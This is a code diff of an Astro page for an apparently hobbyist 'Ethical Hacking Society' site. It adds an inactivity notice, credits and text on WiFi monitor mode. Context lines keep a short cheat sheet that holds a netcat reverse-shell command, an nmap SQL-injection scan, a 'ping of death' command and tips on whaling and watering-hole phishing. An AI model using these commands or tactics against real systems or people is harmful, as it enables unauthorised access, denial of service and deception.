@@ -10,9 +10,13 @@ import AccordionItem from '../../components/accordion/AccordionItem.astro';
 import BackToTop from '../../components/BackToTop.astro';
 ---
 
-<Head title="Ethical Hacking Society" heroid="ehs" description="The Ethical Hacking Society is about ethical hacking as a whole." keyword="scripts, viruses, coding," author="CobraCommander" />
+<Head title="Ethical Hacking Society" heroid="ehs" description="The Ethical Hacking Society is about ethical hacking as a whole." keyword="scripts, viruses, coding," author="Alex Toucan & CobraCommander" />
+      <div id="page">
 <Navbar />
-        <Hero id="ehs" title="Ethical Hacking Society" description="The Ethical Hacking Society is about ethical hacking as a whole." primaryHref="https://discord.gg/yCnteHexEs" primaryText="Discord Server Invite" secondaryHref="/backup/ehs" secondaryText="View the all laid out format"
+      <div class="alert alert-dark mb-0" role="alert">
+        This is an inactive community. Expect no new sections or changes without special exceptions.
+      </div>
+        <Hero id="ehs" title="Ethical Hacking Society" description="The Ethical Hacking Society is about ethical hacking as a whole." primaryHref="https://discord.gg/yCnteHexEs" primaryText="Discord Server Invite" secondaryHref="/ehs" secondaryText="View the pop-up format"
 icons={[
     { icon: "discord", desc: "Discord Server Invite", href: "https://discord.gg/pgGfhDVrmS" },
     { icon: "discord", desc: "Anti Vegans", href: "https://discord.gg/yCnteHexEs" },
@@ -137,6 +141,17 @@ dropdownItems = {[
    <code>nc -e /bin/sh 10.0.0.1 1234</code>
 </p><p> <b><a href="https://nmap.org/">Nmap</a> on Kali Linux SQL Injection</b> - <code>nmap --script=http-sql-injection &lt;target&gt;</code>
 </p><p> <b>Ping of Death in “C”</b> - <code>ping &lt;ip address&gt; -t |65500</code></p>
-<p> <b> Social Engineering</b> - "Spearhead phishing is effective but try something like whaling or watering hole" See <a href="/backup/script#phishing">Phishing Defintions</a></p>
+<p> <b> Social Engineering</b> - "Spearhead phishing is effective but try something like whaling or watering hole" <a href="https://www.wireshark.org/#download">Wireshark</a> is a network protocol analyzer used to capture traffic. <br> <br>Putting your adapter in Monitor mode, or RFMON mode, allows a computer with a wireless network interface controller to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point<br> <br> Buy a WiFi Adapter that supports Monitor Mode.
+ </p>
+<p>
+<a class="icon-link icon-link-hover" href="/backup/script#whpt">
+See phishing definitions
+<i class="bi bi-arrow-right h-100"></i>
+</a>
+</p>
             </div> 
 </main>
+        <Footer author="Alex Toucan & CobraCommander" />
+<BackToTop />
+</div>
+<Scripts />
